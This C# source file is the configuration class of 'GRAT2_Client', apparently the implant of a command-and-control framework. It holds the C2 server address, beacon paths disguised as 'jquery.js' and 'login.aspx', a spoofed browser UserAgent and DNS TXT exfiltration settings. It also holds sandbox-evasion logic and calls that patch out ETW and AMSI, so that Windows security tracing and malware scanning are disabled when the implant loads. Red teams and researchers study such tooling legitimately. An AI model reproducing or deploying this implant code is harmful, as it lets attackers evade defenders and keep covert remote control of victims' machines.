using System;
using System.Collections.Generic;
using System.Linq;

namespace GRAT2_Client.PInvoke
{
    class Config
    {
        public static string c2 = "http://10.0.0.2/"; // Your GRAT2 Server IP Address (Required)
        public static bool sandboxEvasion = SandBoxFunc(0); // If enabled (1), GRAT2 will be executed only on a domain join computer otherwise, GRAT2 will be terminated. If disabled (0), GRAT2 will be executed only on a non domain join computer otherwise, will be terminated.
        public static int patchEtw = EtwFunc(1); // Enable (1) or Disable (0) Etw Patching
        public static int patchAmsi = AmsiFunc(1); // Enable (1) or Disable (0) .NET AMSI Patching
        public static int sleep = 3;
        public static string UserAgent = "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; yie11; rv:11.0) like Gecko"; // Set your UserAgent
        public static string initialUrl = "jquery.js"; // Should be the same with line 42 under GRAT2_Server --> handlers.py
        public static string sendResults = "login.aspx"; // Should be the same with line 78 under GRAT2_Server --> handlers.py
        public static string checker_url = c2 + RandomUrls() + "?";
        // Configure DNS Listener
        public static int DNSListener = 0; // Enable (1) or Disable (0)
        public static string DNSServer = ""; // Your Domain NameServer
        public static int dnsMaxTXT = 255; // Maximum length of TXT Records
        public static int maxDNSChar = 63; // The maximum size in chars for each DNS subdomain

        private static string RandomUrls()
        {
            var random = new Random();
            var randomurls = new List<string> { "index.aspx", "question", "contactus", "aboutus.aspx" };
            int index = random.Next(0, randomurls.Count);
            string urls = randomurls[index];
            return urls;
        }

        public static string RandomString(int length)
        {
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
            return new string(Enumerable.Repeat(chars, length)
              .Select(s => s[random.Next(s.Length)]).ToArray());
        }
        private static Random random = new Random();

        private static bool SandBoxFunc(int value)
        {
            if (value == 1)
            {
                if (string.IsNullOrEmpty(Anti_Functions.Domain_Check()))
                {
                    Environment.Exit(0);
                }
            }
            else
            {
                if (!string.IsNullOrEmpty(Anti_Functions.Domain_Check()))
                {
                    Environment.Exit(0);
                }
            }

            return true;
        }

        private static int EtwFunc(int value)
        {
            if (value == 1)
            {
                Anti_Functions.PatchingEtw();
            }
            
            return value;
        }

        private static int AmsiFunc(int value)
        {
            if (value == 1)
            {
                Anti_Functions.PatchingAmsi();
            }

            return value;
        }
    }
}
